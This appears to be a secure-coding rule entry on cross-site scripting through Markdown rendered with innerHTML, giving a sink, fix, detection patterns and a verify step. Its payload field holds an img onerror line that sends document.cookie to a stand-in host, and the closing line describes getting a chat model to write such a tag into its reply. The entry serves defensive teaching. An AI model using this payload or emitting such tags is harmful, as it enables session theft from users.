---
cwe: 79
owasp: A05
title: Markdown rendered as HTML
category: content
severity: critical
sink: |-
    el.innerHTML = marked.parse(message.text)
payload: |-
    Nice post! <img src=x onerror="fetch('//evil.sh?c='+document.cookie)">
fix: |
    el.innerHTML = DOMPurify.sanitize(marked.parse(message.text));
detect:
    - 'marked(\.parse)?\('
    - "markdown-it"
    - "rehype-raw"
    - "showdown"
verify: "Write `<img src=x onerror=alert(1)>` into a Markdown field and view the rendered result."
fineWhen: "The renderer drops raw HTML — `markdown-it` with `html: false`, `react-markdown` without `rehype-raw` — and its output is sanitised or link protocols are filtered."
refs:
    - https://marked.js.org/
    - https://github.com/cure53/DOMPurify
---

Markdown allows raw HTML, and your parser passes mine through untouched. Chat apps that render a model's reply are my new favourite: I get the model to write the tag for me. Sanitise what the parser returns, not what goes in.
